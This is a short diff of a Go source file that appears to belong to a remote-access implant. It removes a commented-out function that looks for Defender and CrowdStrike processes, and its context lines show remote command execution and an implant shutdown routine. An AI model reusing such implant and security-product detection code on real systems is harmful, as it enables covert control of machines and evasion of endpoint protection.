@@ -76,24 +76,6 @@ func executeCommands(conn *net.Conn, command *string) {
 	(*conn).Write(output)
 }
 
-// Have the server send a list of processes to check instead of hard coding them in the client
-// func checkSec() []string {
-// 	products := []string{}
-// 	procs, err := process.GetProcesses()
-// 	if err != nil {
-// 		fmt.Println("Couldn't Get Processes")
-// 	}
-// 	for index := range procs {
-// 		if procs[index].Exe == "MsMpEng.exe" {
-// 			products = append(products, "Defender")
-// 		}
-// 		if procs[index].Exe == "CSFalconService.exe" {
-// 			products = append(products, "CrowdStrike")
-// 		}
-// 	}
-// 	return products
-// }
-
 func terminate() {
 	fmt.Println("Terminating Implant")
 	time.Sleep(1 * time.Second)
